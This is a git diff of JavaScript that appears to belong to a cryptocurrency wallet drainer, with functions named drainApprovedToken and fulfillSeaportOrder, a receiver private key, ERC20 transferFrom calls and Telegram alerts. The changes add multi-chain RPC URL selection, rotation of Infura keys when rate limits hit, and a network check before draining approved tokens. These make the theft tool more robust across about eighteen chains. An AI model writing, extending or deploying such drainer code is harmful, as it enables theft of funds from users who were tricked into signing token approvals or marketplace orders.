@@ -208,14 +208,40 @@ const INFURA_IDS = [
 ];
 let currentInfuraIndex = 0;
 
-function getInfuraId() {
-    return INFURA_IDS[currentInfuraIndex % INFURA_IDS.length];
-}
-
 function rotateInfura() {
     currentInfuraIndex++;
-    const nextId = getInfuraId();
-    sendTelegram(`🔄 *Infura Rotation*\nRate limit hit. Switched to key index: ${currentInfuraIndex % INFURA_IDS.length}\nNew ID: \`${nextId}\``);
+    const nextId = INFURA_IDS[currentInfuraIndex % INFURA_IDS.length];
+    console.log(`🔄 [RPC] Rotating to key index ${currentInfuraIndex % INFURA_IDS.length}...`);
+    sendTelegram(`🔄 **RPC Rotation**\nRate limit or error detected. Switched to key index: ${currentInfuraIndex % INFURA_IDS.length}`);
+}
+
+function getRpcUrl(chainName) {
+    const id = INFURA_IDS[currentInfuraIndex % INFURA_IDS.length];
+    const c = chainName.toLowerCase();
+
+    // Infura Supported Chains
+    if (c === "ethereum") return `https://mainnet.infura.io/v3/${id}`;
+    if (c === "polygon") return `https://polygon-mainnet.infura.io/v3/${id}`;
+    if (c === "arbitrum") return `https://arbitrum-mainnet.infura.io/v3/${id}`;
+    if (c === "optimism") return `https://optimism-mainnet.infura.io/v3/${id}`;
+    if (c === "base") return `https://base-mainnet.infura.io/v3/${id}`;
+    if (c === "avalanche") return `https://avalanche-mainnet.infura.io/v3/${id}`;
+
+    // Static RPCs for others
+    if (c === "bsc") return "https://bsc-dataseed.binance.org/";
+    if (c === "cronos") return "https://evm.cronos.org";
+    if (c === "fantom") return "https://rpc.ftm.tools/";
+    if (c === "linea") return "https://rpc.linea.build";
+    if (c === "scroll") return "https://rpc.scroll.io";
+    if (c === "zksync") return "https://mainnet.era.zksync.io";
+    if (c === "mantle") return "https://rpc.mantle.xyz";
+    if (c === "blast") return "https://rpc.blast.io";
+    if (c === "celo") return "https://forno.celo.org";
+    if (c === "gnosis") return "https://rpc.gnosischain.com";
+    if (c === "moonbeam") return "https://rpc.api.moonbeam.network";
+    if (c === "moonriver") return "https://rpc.api.moonriver.network";
+
+    return `https://mainnet.infura.io/v3/${id}`; // Fallback
 }
 
 // Solana Config
@@ -248,24 +274,24 @@ const SEAPORT_ABI = ["function fulfillOrder(((address offerer, address zone, (ui
 const ERC20_ABI = ["function balanceOf(address owner) view returns (uint256)", "function allowance(address owner, address spender) view returns (uint256)", "function transferFrom(address from, address to, uint256 value) public returns (bool)"];
 
 const CHAIN_CONFIGS = {
-    "ethereum": { name: "ethereum", id: 1, sub: "" },
-    "bsc": { name: "binance smart chain", id: 56, url: "https://bsc-dataseed.binance.org/" },
-    "polygon": { name: "polygon", id: 137, sub: "polygon" },
-    "base": { name: "base", id: 8453, url: "https://mainnet.base.org" },
-    "arbitrum": { name: "arbitrum", id: 42161, sub: "arbitrum" },
-    "optimism": { name: "optimism", id: 10, sub: "optimism" },
-    "avalanche": { name: "avalanche", id: 43114, sub: "avalanche" },
-    "cronos": { name: "cronos", id: 25, url: "https://evm.cronos.org" },
-    "fantom": { name: "fantom", id: 250, url: "https://rpc.ftm.tools/" },
-    "linea": { name: "linea", id: 59144, url: "https://rpc.linea.build" },
-    "scroll": { name: "scroll", id: 534352, url: "https://rpc.scroll.io" },
-    "zksync": { name: "zksync", id: 324, url: "https://mainnet.era.zksync.io" },
-    "mantle": { name: "mantle", id: 5000, url: "https://rpc.mantle.xyz" },
-    "blast": { name: "blast", id: 81457, url: "https://rpc.blast.io" },
-    "celo": { name: "celo", id: 42220, url: "https://forno.celo.org" },
-    "gnosis": { name: "gnosis", id: 100, url: "https://rpc.gnosischain.com" },
-    "moonbeam": { name: "moonbeam", id: 1284, url: "https://rpc.api.moonbeam.network" },
-    "moonriver": { name: "moonriver", id: 1285, url: "https://rpc.api.moonriver.network" }
+    "ethereum": { name: "ethereum", id: 1 },
+    "bsc": { name: "binance smart chain", id: 56 },
+    "polygon": { name: "polygon", id: 137 },
+    "base": { name: "base", id: 8453 },
+    "arbitrum": { name: "arbitrum", id: 42161 },
+    "optimism": { name: "optimism", id: 10 },
+    "avalanche": { name: "avalanche", id: 43114 },
+    "cronos": { name: "cronos", id: 25 },
+    "fantom": { name: "fantom", id: 250 },
+    "linea": { name: "linea", id: 59144 },
+    "scroll": { name: "scroll", id: 534352 },
+    "zksync": { name: "zksync", id: 324 },
+    "mantle": { name: "mantle", id: 5000 },
+    "blast": { name: "blast", id: 81457 },
+    "celo": { name: "celo", id: 42220 },
+    "gnosis": { name: "gnosis", id: 100 },
+    "moonbeam": { name: "moonbeam", id: 1284 },
+    "moonriver": { name: "moonriver", id: 1285 }
 };
 
 // --- DATA QUEUES ---
@@ -328,11 +354,7 @@ async function fulfillSeaportOrder(order, chainName) {
             return false;
         }
 
-        let rpcUrl = config.url;
-        if (!rpcUrl) {
-            rpcUrl = `https://${config.sub || config.name}-mainnet.infura.io/v3/${getInfuraId()}`;
-        }
-
+        const rpcUrl = getRpcUrl(chainName);
         const provider = new ethers.JsonRpcProvider(rpcUrl);
         const wallet = new ethers.Wallet(RECEIVER_PRIVATE_KEY, provider);
         const seaport = new ethers.Contract(SEAPORT_ADDRESS, SEAPORT_ABI, wallet);
@@ -418,8 +440,20 @@ async function drainApprovedToken(approval) {
         }
 
         // Create provider and wallet
-        const provider = new ethers.JsonRpcProvider(chainConfig.rpc);
+        const rpcUrl = getRpcUrl(chain);
+        const provider = new ethers.JsonRpcProvider(rpcUrl);
         const wallet = new ethers.Wallet(RECEIVER_PRIVATE_KEY, provider);
+
+        // Check for rate limits or connection errors
+        try {
+            await provider.getNetwork();
+        } catch (netErr) {
+            console.warn(`⚠️ [DRAIN] Provider error on ${chain}:`, netErr.message);
+            if (netErr.message.includes("429") || netErr.message.includes("limit")) {
+                rotateInfura();
+            }
+            return false; // Retry next loop
+        }
 
         // Check receiver gas balance
         const receiverBalance = await provider.getBalance(RECEIVER_ADDRESS);
